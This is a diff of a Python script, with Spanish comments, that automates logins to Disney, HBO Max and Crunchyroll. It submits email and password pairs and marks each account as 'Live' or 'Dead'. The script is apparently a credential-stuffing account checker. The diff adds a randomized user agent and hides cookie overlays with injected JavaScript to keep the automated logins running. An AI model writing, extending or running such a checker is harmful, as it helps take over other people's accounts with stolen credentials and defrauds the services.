@@ -1,18 +1,8 @@
-import os
 import re
 import ast
 import time
 import random
-import logging
-import datetime
-import subprocess
-import shutil
-import urllib.request 
-import getpass
-import zipfile
-# import socket
 import time as tmp
-# import concurrent.futures
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.firefox.options import Options
@@ -21,12 +11,6 @@ from selenium.webdriver.common.action_chains import ActionChains
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.common.exceptions import NoSuchElementException,TimeoutException
 from playwright.sync_api import sync_playwright
-
-from playwright._impl._errors import Error  
-
-logger = logging.getLogger(__name__)
-now = datetime.datetime.now()
-fecha = now.strftime("%d-%m-%y")
 
 def Cookie(file,matches):
     with open(f'{file}','r') as reads_cookies:
@@ -117,7 +101,6 @@ def Disney(Co,Cs):
         # ---- Busca la casiila de donde enviar el Correo -----#
         correo = short.until(EC.presence_of_element_located((By.ID,'email'))).send_keys(Co)
         CorreoClick = driver.find_element(By.XPATH,'/html/body/div/div/main/div/div/div/div/div[2]/div/form/button').click()
-        logger.debug('Enviando Correo')  
         # -----------------------------------------------------#
         try:
             contrasena = short.until(EC.presence_of_element_located((By.ID,'password'))).send_keys(Cs) 
@@ -141,71 +124,53 @@ def Disney(Co,Cs):
 
 def Hbo(Co,Cs):
     with sync_playwright() as playwright:
+        browser = playwright.firefox.launch(headless=False)
+        context = browser.new_context(user_agent=GenAgent())
+        page = context.new_page()  # Create the page here
+        page.goto('https://auth.max.com/login?flow=login')
+
+        elements = [
+                "#onetrust-banner-sdk .ot-sdk-column",
+                "#onetrust-banner-sdk .ot-sdk-columns",
+                "#onetrust-pc-sdk .ot-sdk-column",
+                "#onetrust-pc-sdk .ot-sdk-columns",
+                "#ot-sdk-cookie-policy .ot-sdk-column",
+                "#ot-sdk-cookie-policy .ot-sdk-columns"
+            ]
+
+        dark_filter = page.wait_for_selector("div.onetrust-pc-dark-filter.ot-fade-in", timeout=60000) 
+        page.evaluate("""(el) => el.style.position = 'relative';""", dark_filter)
+        
+        for element in elements:
+            js = f'document.querySelectorAll("{element}").forEach(element => element.style.display = "none");'
+            page.evaluate(js)
+
+        page.get_by_test_id("gisdk.gi-login-username.email_field").click()
+        page.get_by_test_id("gisdk.gi-login-username.email_field").fill(f"{Co}")
+
+        page.get_by_test_id("gisdk.gi-login-username.password_field").click()
+        page.get_by_test_id("gisdk.gi-login-username.password_field").fill(f"{Cs}")
+
+        page.get_by_test_id("gisdk.gi-login-username.signIn_button").click()
+
         try:
-            browser = playwright.firefox.launch(headless=False)
-            context = browser.new_context()
-            page = context.new_page()  # Create the page here
-            page.goto('https://auth.max.com/login?flow=login')
+            # https://stackoverflow.com/questions/64303326/using-playwright-for-python-how-do-i-select-or-find-an-element
 
-            elements = [
-                    "#onetrust-banner-sdk .ot-sdk-column",
-                    "#onetrust-banner-sdk .ot-sdk-columns",
-                    "#onetrust-pc-sdk .ot-sdk-column",
-                    "#onetrust-pc-sdk .ot-sdk-columns",
-                    "#ot-sdk-cookie-policy .ot-sdk-column",
-                    "#ot-sdk-cookie-policy .ot-sdk-columns"
-                ]
-
-            dark_filter = page.wait_for_selector("div.onetrust-pc-dark-filter.ot-fade-in", timeout=60000) 
-            page.evaluate("""(el) => el.style.position = 'relative';""", dark_filter)
-            
-            for element in elements:
-                js = f'document.querySelectorAll("{element}").forEach(element => element.style.display = "none");'
-                page.evaluate(js)
-
-            page.get_by_test_id("gisdk.gi-login-username.email_field").click()
-            page.get_by_test_id("gisdk.gi-login-username.email_field").fill(f"{Co}")
-
-            page.get_by_test_id("gisdk.gi-login-username.password_field").click()
-            page.get_by_test_id("gisdk.gi-login-username.password_field").fill(f"{Cs}")
-
-            page.get_by_test_id("gisdk.gi-login-username.signIn_button").click()
-
-            try:
-                # https://stackoverflow.com/questions/64303326/using-playwright-for-python-how-do-i-select-or-find-an-element
-
-                time.sleep(8)
-                locat = page.query_selector(".notification-message")
-                msg = 'That email address or password doesn’t look right.'
-                if locat.inner_html() == msg:
-                    page.close()
-                    return f'[x][Correo:{Co}][Estado: Dead]'
-                    
-            except Exception:
+            time.sleep(8)
+            locat = page.query_selector(".notification-message")
+            msg = 'That email address or password doesn’t look right.'
+            if locat.inner_html() == msg:
                 page.close()
-                return f'[/][Correo:{Co}][Estado: Live]'
-            
-        except Error:
-            print('[-] Instalando Componente De Playwright Faltante')
-            target_dir = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\ms-playwright\\firefox-1449"
-            url = 'https://playwright.azureedge.net/builds/firefox/1449/firefox-win64.zip'
-            name_tmp = os.path.basename(url)
-
-            os.path.basename(url)  
-            urllib.request.urlretrieve(url,url[53:])
-
-            os.makedirs(target_dir, exist_ok=True)
-            shutil.move(os.path.join(os.getcwd(),url[53:]),target_dir)
-            os.chdir(target_dir)
-            with zipfile.ZipFile(url[53:], "r") as zip_ref:
-                zip_ref.extractall()
-            os.remove(name_tmp)
+                return f'[x][Correo:{Co}][Estado: Dead]'
+                
+        except Exception:
+            page.close()
+            return f'[/][Correo:{Co}][Estado: Live]'
         
 def Crunchyroll(Co,Cs):
     try:
         driver,short = Config('https://sso.crunchyroll.com/login',True,7)
 
-        # Co,Cs = next(CadenaUsuarios)
         Correo = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div[2]/div/main/div/form/div[1]/div[1]/div/label/input'))).send_keys(Co)
         Constrasena = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div[2]/div/main/div/form/div[1]/div[2]/div/label/input'))).send_keys(Cs)
         Access = short.until(EC.presence_of_element_located((By.XPATH,'/html/body/div[2]/div/main/div/form/div[2]/button'))).click()
@@ -213,7 +178,6 @@ def Crunchyroll(Co,Cs):
         try:
             session = short.until(EC.presence_of_element_located((By.CSS_SELECTOR,'.avatar-wrapper')))
             driver.quit()
-            # print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado: Live]')
             msg = f'[{Co}][stado:live]'
             return msg
 
@@ -221,20 +185,9 @@ def Crunchyroll(Co,Cs):
             driver.quit()
             msg = f'[{Co}][stado:dead]'
             return msg
-            # print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado: Dead]')
-
-    except KeyboardInterrupt:
-        pass
         
-        # print(f'[{fecha}] [Correo:{Co}] [Contrasena:{Cs}] [Estado: Live]')
-        # break
-
     except TimeoutException:
-        print('[-] Se agoto el tiempo')
-
-    except StopIteration:
-        print('[+] Finaliso el script')
-        # break
+        pass
 
 def NC(Email,value):
     try:
